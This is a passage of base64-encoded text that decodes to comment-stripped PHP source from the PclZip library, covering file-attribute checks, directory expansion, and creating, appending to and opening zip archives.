vckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCBmaWxlIGF0dHJpYnV0ZSAnIi4kdl9rZXkuIicgZm9yIHRoaXMgZmlsZSIpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICBzd2l0Y2ggKCR2X2tleSkgew0KICAgICAgY2FzZSBQQ0xaSVBfQVRUX0ZJTEVfTkFNRSA6DQogICAgICAgIGlmICghaXNfc3RyaW5nKCR2X3ZhbHVlKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BVFRSSUJVVEVfVkFMVUUsICJJbnZhbGlkIHR5cGUgIi5nZXR0eXBlKCR2X3ZhbHVlKS4iLiBTdHJpbmcgZXhwZWN0ZWQgZm9yIGF0dHJpYnV0ZSAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkdl9rZXkpLiInIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICAkcF9maWxlZGVzY3JbJ2ZpbGVuYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl92YWx1ZSk7DQogICAgICAgIA0KICAgICAgICBpZiAoJHBfZmlsZWRlc2NyWydmaWxlbmFtZSddID09ICcnKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgZW1wdHkgZmlsZW5hbWUgZm9yIGF0dHJpYnV0ZSAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkdl9rZXkpLiInIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX05FV19TSE9SVF9OQU1FIDoNCiAgICAgICAgaWYgKCFpc19zdHJpbmcoJHZfdmFsdWUpKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgdHlwZSAiLmdldHR5cGUoJHZfdmFsdWUpLiIuIFN0cmluZyBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnbmV3X3Nob3J0X25hbWUnXSA9IFBjbFppcFV0aWxQYXRoUmVkdWN0aW9uKCR2X3ZhbHVlKTsNCg0KICAgICAgICBpZiAoJHBfZmlsZWRlc2NyWyduZXdfc2hvcnRfbmFtZSddID09ICcnKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgZW1wdHkgc2hvcnQgZmlsZW5hbWUgZm9yIGF0dHJpYnV0ZSAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkdl9rZXkpLiInIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9ORVdfRlVMTF9OQU1FIDoNCiAgICAgICAgaWYgKCFpc19zdHJpbmcoJHZfdmFsdWUpKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgdHlwZSAiLmdldHR5cGUoJHZfdmFsdWUpLiIuIFN0cmluZyBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfdmFsdWUpOw0KDQogICAgICAgIGlmICgkcF9maWxlZGVzY3JbJ25ld19mdWxsX25hbWUnXSA9PSAnJykgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BVFRSSUJVVEVfVkFMVUUsICJJbnZhbGlkIGVtcHR5IGZ1bGwgZmlsZW5hbWUgZm9yIGF0dHJpYnV0ZSAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkdl9rZXkpLiInIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9DT01NRU5UIDoNCiAgICAgICAgaWYgKCFpc19zdHJpbmcoJHZfdmFsdWUpKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgdHlwZSAiLmdldHR5cGUoJHZfdmFsdWUpLiIuIFN0cmluZyBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnY29tbWVudCddID0gJHZfdmFsdWU7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfQVRUX0ZJTEVfTVRJTUUgOg0KICAgICAgICBpZiAoIWlzX2ludGVnZXIoJHZfdmFsdWUpKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgdHlwZSAiLmdldHR5cGUoJHZfdmFsdWUpLiIuIEludGVnZXIgZXhwZWN0ZWQgZm9yIGF0dHJpYnV0ZSAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkdl9rZXkpLiInIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICAkcF9maWxlZGVzY3JbJ210aW1lJ10gPSAkdl92YWx1ZTsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9DT05URU5UIDoNCiAgICAgICAgJHBfZmlsZWRlc2NyWydjb250ZW50J10gPSAkdl92YWx1ZTsNCiAgICAgIGJyZWFrOw0KDQogICAgICBkZWZhdWx0IDoNCiAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAiVW5rbm93biBwYXJhbWV0ZXIgJyIuJHZfa2V5LiInIik7DQoNCiAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgfQ0KDQogICAgaWYgKCR2X3JlcXVlc3RlZF9vcHRpb25zICE9PSBmYWxzZSkgew0KICAgICAgZm9yICgka2V5PXJlc2V0KCR2X3JlcXVlc3RlZF9vcHRpb25zKTsgJGtleT1rZXkoJHZfcmVxdWVzdGVkX29wdGlvbnMpOyAka2V5PW5leHQoJHZfcmVxdWVzdGVkX29wdGlvbnMpKSB7DQogICAgICAgIGlmICgkdl9yZXF1ZXN0ZWRfb3B0aW9uc1ska2V5XSA9PSAnbWFuZGF0b3J5Jykgew0KICAgICAgICAgIGlmICghaXNzZXQoJHBfZmlsZV9saXN0WyRrZXldKSkgew0KICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk1pc3NpbmcgbWFuZGF0b3J5IHBhcmFtZXRlciAiLlBjbFppcFV0aWxPcHRpb25UZXh0KCRrZXkpLiIoIi4ka2V5LiIpIik7DQogICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogIA0KICB9DQogIA0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RmlsZURlc2NyRXhwYW5kKCYkcF9maWxlZGVzY3JfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICANCiAgJHZfcmVzdWx0X2xpc3QgPSBhcnJheSgpOw0KICANCiAgZm9yICgkaT0wOyAkaTxzaXplb2YoJHBfZmlsZWRlc2NyX2xpc3QpOyAkaSsrKSB7DQogICAgDQogICAgJHZfZGVzY3IgPSAkcF9maWxlZGVzY3JfbGlzdFskaV07DQogICAgDQogICAgJHZfZGVzY3JbJ2ZpbGVuYW1lJ10gPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkdl9kZXNjclsnZmlsZW5hbWUnXSwgZmFsc2UpOw0KICAgICR2X2Rlc2NyWydmaWxlbmFtZSddID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfZGVzY3JbJ2ZpbGVuYW1lJ10pOw0KICAgIA0KICAgIGlmIChmaWxlX2V4aXN0cygkdl9kZXNjclsnZmlsZW5hbWUnXSkpIHsNCiAgICAgIGlmIChAaXNfZmlsZSgkdl9kZXNjclsnZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgJHZfZGVzY3JbJ3R5cGUnXSA9ICdmaWxlJzsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKEBpc19kaXIoJHZfZGVzY3JbJ2ZpbGVuYW1lJ10pKSB7DQogICAgICAgICR2X2Rlc2NyWyd0eXBlJ10gPSAnZm9sZGVyJzsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKEBpc19saW5rKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgICBjb250aW51ZTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgICBjb250aW51ZTsNCiAgICAgIH0NCiAgICB9DQogICAgDQogICAgZWxzZSBpZiAoaXNzZXQoJHZfZGVzY3JbJ2NvbnRlbnQnXSkpIHsNCiAgICAgICR2X2Rlc2NyWyd0eXBlJ10gPSAndmlydHVhbF9maWxlJzsNCiAgICB9DQogICAgDQogICAgZWxzZSB7DQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfRklMRSwgIkZpbGUgJyIuJHZfZGVzY3JbJ2ZpbGVuYW1lJ10uIicgZG9lcyBub3QgZXhpc3QiKTsNCg0KICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgfQ0KICAgIA0KICAgICR0aGlzLT5wcml2Q2FsY3VsYXRlU3RvcmVkRmlsZW5hbWUoJHZfZGVzY3IsICRwX29wdGlvbnMpOw0KICAgIA0KICAgICR2X3Jlc3VsdF9saXN0W3NpemVvZigkdl9yZXN1bHRfbGlzdCldID0gJHZfZGVzY3I7DQogICAgDQogICAgaWYgKCR2X2Rlc2NyWyd0eXBlJ10gPT0gJ2ZvbGRlcicpIHsNCiAgICAgICR2X2Rpcmxpc3RfZGVzY3IgPSBhcnJheSgpOw0KICAgICAgJHZfZGlybGlzdF9uYiA9IDA7DQogICAgICBpZiAoJHZfZm9sZGVyX2hhbmRsZXIgPSBAb3BlbmRpcigkdl9kZXNjclsnZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgd2hpbGUgKCgkdl9pdGVtX2hhbmRsZXIgPSBAcmVhZGRpcigkdl9mb2xkZXJfaGFuZGxlcikpICE9PSBmYWxzZSkgew0KDQogICAgICAgICAgaWYgKCgkdl9pdGVtX2hhbmRsZXIgPT0gJy4nKSB8fCAoJHZfaXRlbV9oYW5kbGVyID09ICcuLicpKSB7DQogICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgIH0NCiAgICAgICAgICANCiAgICAgICAgICAkdl9kaXJsaXN0X2Rlc2NyWyR2X2Rpcmxpc3RfbmJdWydmaWxlbmFtZSddID0gJHZfZGVzY3JbJ2ZpbGVuYW1lJ10uJy8nLiR2X2l0ZW1faGFuZGxlcjsNCiAgICAgICAgICANCiAgICAgICAgICBpZiAoKCR2X2Rlc2NyWydzdG9yZWRfZmlsZW5hbWUnXSAhPSAkdl9kZXNjclsnZmlsZW5hbWUnXSkNCiAgICAgICAgICAgICAgICYmICghaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF0pKSkgew0KICAgICAgICAgICAgaWYgKCR2X2Rlc2NyWydzdG9yZWRfZmlsZW5hbWUnXSAhPSAnJykgew0KICAgICAgICAgICAgICAkdl9kaXJsaXN0X2Rlc2NyWyR2X2Rpcmxpc3RfbmJdWyduZXdfZnVsbF9uYW1lJ10gPSAkdl9kZXNjclsnc3RvcmVkX2ZpbGVuYW1lJ10uJy8nLiR2X2l0ZW1faGFuZGxlcjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAkdl9kaXJsaXN0X2Rlc2NyWyR2X2Rpcmxpc3RfbmJdWyduZXdfZnVsbF9uYW1lJ10gPSAkdl9pdGVtX2hhbmRsZXI7DQogICAgICAgICAgICB9DQogICAgICAgICAgfQ0KICAgIA0KICAgICAgICAgICR2X2Rpcmxpc3RfbmIrKzsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgQGNsb3NlZGlyKCR2X2ZvbGRlcl9oYW5kbGVyKTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgfQ0KICAgICAgDQogICAgICBpZiAoJHZfZGlybGlzdF9uYiAhPSAwKSB7DQogICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZGaWxlRGVzY3JFeHBhbmQoJHZfZGlybGlzdF9kZXNjciwgJHBfb3B0aW9ucykpICE9IDEpIHsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkdl9yZXN1bHRfbGlzdCA9IGFycmF5X21lcmdlKCR2X3Jlc3VsdF9saXN0LCAkdl9kaXJsaXN0X2Rlc2NyKTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgfQ0KICAgICAgICANCiAgICAgIHVuc2V0KCR2X2Rpcmxpc3RfZGVzY3IpOw0KICAgIH0NCiAgfQ0KICANCiAgJHBfZmlsZWRlc2NyX2xpc3QgPSAkdl9yZXN1bHRfbGlzdDsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2Q3JlYXRlKCRwX2ZpbGVkZXNjcl9saXN0LCAmJHBfcmVzdWx0X2xpc3QsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgJHZfbGlzdF9kZXRhaWwgPSBhcnJheSgpOw0KICANCiAgJHRoaXMtPnByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKTsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2T3BlbkZkKCd3YicpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2QWRkTGlzdCgkcF9maWxlZGVzY3JfbGlzdCwgJHBfcmVzdWx0X2xpc3QsICRwX29wdGlvbnMpOw0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGQoJHBfZmlsZWRlc2NyX2xpc3QsICYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICAkdl9saXN0X2RldGFpbCA9IGFycmF5KCk7DQoNCiAgaWYgKCghaXNfZmlsZSgkdGhpcy0+emlwbmFtZSkpIHx8IChmaWxlc2l6ZSgkdGhpcy0+emlwbmFtZSkgPT0gMCkpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q3JlYXRlKCRwX2ZpbGVkZXNjcl9saXN0LCAkcF9yZXN1bHRfbGlzdCwgJHBfb3B0aW9ucyk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQogICR0aGlzLT5wcml2RGlzYWJsZU1hZ2ljUXVvdGVzKCk7DQoNCiAgaWYgKCgkdl9yZXN1bHQ9JHRoaXMtPnByaXZPcGVuRmQoJ3JiJykpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9jZW50cmFsX2RpciA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCg0KICAkdl96aXBfdGVtcF9uYW1lID0gUENMWklQX1RFTVBPUkFSWV9ESVIudW5pcWlkKCdwY2x6aXAtJykuJy50bXAnOw0KDQogIGlmICgoJHZfemlwX3RlbXBfZmQgPSBAZm9wZW4oJHZfemlwX3RlbXBfbmFtZSwgJ3diJykpID09IDApDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfemlwX3RlbXBfbmFtZS4nXCcgaW4gYmluYXJ5IHdyaXRlIG1vZGUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfc2l6ZSA9ICR2X2NlbnRyYWxfZGlyWydvZmZzZXQnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHZfemlwX3RlbXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR2X3N3YXAgPSAkdGhpcy0+emlwX2ZkOw0KICAkdGhpcy0+emlwX2ZkID0gJHZfemlwX3RlbXBfZmQ7DQogICR2X3ppcF90ZW1wX2ZkID0gJHZfc3dhcDsNCg0KICAkdl9oZWFkZXJfbGlzdCA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGRGaWxlTGlzdCgkcF9maWxlZGVzY3JfbGlzdCwgJHZfaGVhZGVyX2xpc3QsICRwX29wdGlvbnMpKSAhPSAxKQ0KICB7DQogICAgZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICBAdW5saW5rKCR2X3ppcF90ZW1wX25hbWUpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X29mZnNldCA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKTsNCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJbJ3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHZfemlwX3RlbXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdGhpcy0+emlwX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICBmb3IgKCRpPTAsICR2X2NvdW50PTA7ICRpPHNpemVvZigkdl9oZWFkZXJfbGlzdCk7ICRpKyspDQogIHsNCiAgICBpZiAoJHZfaGVhZGVyX2xpc3RbJGldWydzdGF0dXMnXSA9PSAnb2snKSB7DQogICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2V3JpdGVDZW50cmFsRmlsZUhlYWRlcigkdl9oZWFkZXJfbGlzdFskaV0pKSAhPSAxKSB7DQogICAgICAgIGZjbG9zZSgkdl96aXBfdGVtcF9mZCk7DQogICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICBAdW5saW5rKCR2X3ppcF90ZW1wX25hbWUpOw0KICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgICAgJHZfY291bnQrKzsNCiAgICB9DQoNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyX2xpc3RbJGldLCAkcF9yZXN1bHRfbGlzdFskaV0pOw0KICB9DQoNCiAgJHZfY29tbWVudCA9ICR2X2NlbnRyYWxfZGlyWydjb21tZW50J107DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF0pKSB7DQogICAgJHZfY29tbWVudCA9ICRwX29wdGlvbnNbUENMWklQX09QVF9DT01NRU5UXTsNCiAgfQ0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9DT01NRU5UXSkpIHsNCiAgICAkdl9jb21tZW50ID0gJHZfY29tbWVudC4kcF9vcHRpb25zW1BDTFpJUF9PUFRfQUREX0NPTU1FTlRdOw0KICB9DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUFJFUEVORF9DT01NRU5UXSkpIHsNCiAgICAkdl9jb21tZW50ID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1BSRVBFTkRfQ09NTUVOVF0uJHZfY29tbWVudDsNCiAgfQ0KDQogICR2X3NpemUgPSBAZnRlbGwoJHRoaXMtPnppcF9mZCktJHZfb2Zmc2V0Ow0KDQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUNlbnRyYWxIZWFkZXIoJHZfY291bnQrJHZfY2VudHJhbF9kaXJbJ2VudHJpZXMnXSwgJHZfc2l6ZSwgJHZfb2Zmc2V0LCAkdl9jb21tZW50KSkgIT0gMSkNCiAgew0KICAgIHVuc2V0KCR2X2hlYWRlcl9saXN0KTsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9zd2FwID0gJHRoaXMtPnppcF9mZDsNCiAgJHRoaXMtPnppcF9mZCA9ICR2X3ppcF90ZW1wX2ZkOw0KICAkdl96aXBfdGVtcF9mZCA9ICR2X3N3YXA7DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgQGZjbG9zZSgkdl96aXBfdGVtcF9mZCk7DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgQHVubGluaygkdGhpcy0+emlwbmFtZSk7DQoNCiAgUGNsWmlwVXRpbFJlbmFtZSgkdl96aXBfdGVtcF9uYW1lLCAkdGhpcy0+emlwbmFtZSk7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdk9wZW5GZCgkcF9tb2RlKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoJHRoaXMtPnppcF9mZCAhPSAwKQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1ppcCBmaWxlIFwnJy4kdGhpcy0+emlwbmFtZS4nXCcgYWxyZWFkeSBvcGVuJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIGlmICgoJHRoaXMtPnppcF9mZCA9IEBmb3BlbigkdGhpcy0+emlwbmFtZSwgJHBfbW9kZSkpID09IDApDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnIGluICcuJHBfbW9kZS4nIG1vZGUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkNsb3NlRmQoKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoJHRoaXMtPnppcF9mZCAhPSAwKQ0KICAgIEBmY2xvc2UoJHRoaXMtPnppcF9mZCk7DQogICR0aGlzLT56aXBfZmQgPSAwOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGRMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAmJHBfcmVzdWx0X2xpc3QsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdl9oZWFkZXJfbGlzdCA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGRGaWxlTGlzdCgkcF9maWxlZGVzY3JfbGlzdCwgJHZfaGVhZGVyX2xpc3QsICRwX29wdGlvbnMpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X29mZnNldCA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKTsNCg0KICBmb3IgKCRpPTAsJHZfY291bnQ9MDsgJGk8c2l6ZW9mKCR2X2hlYWRlcl9saXN0KTsgJGkrKykNCiAgew0KICAgIGlmICgkdl9oZWFkZXJfbGlzdFskaV1bJ3N0YXR1cyddID09ICdvaycpIHsNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUNlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcl9saXN0WyRpXSkpICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCiAgICAgICR2X2NvdW50Kys7DQogICAgfQ0KDQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlcl9saXN0WyRpXSwgJHBfcmVzdWx0X2xpc3RbJGldKTsNCiAgfQ0KDQogICR2X2NvbW1lbnQgPSAnJzsNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9DT01NRU5UXSkpIHsNCiAgICAkdl9jb21tZW50ID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdOw0KICB9DQoNCiAgJHZfc2l6ZSA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKS0kdl9vZmZzZXQ7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcigkdl9jb3VudCwgJHZfc2l6ZSwgJHZfb2Zmc2V0LCAkdl9jb21tZW50KSkgIT0gMSkNCiAgew0KICAgIHVuc2V0KCR2X2hlYWRlcl9saXN0KTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2QWRkRmlsZUxpc3QoJHBfZmlsZWRlc2NyX2xpc3QsICYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvb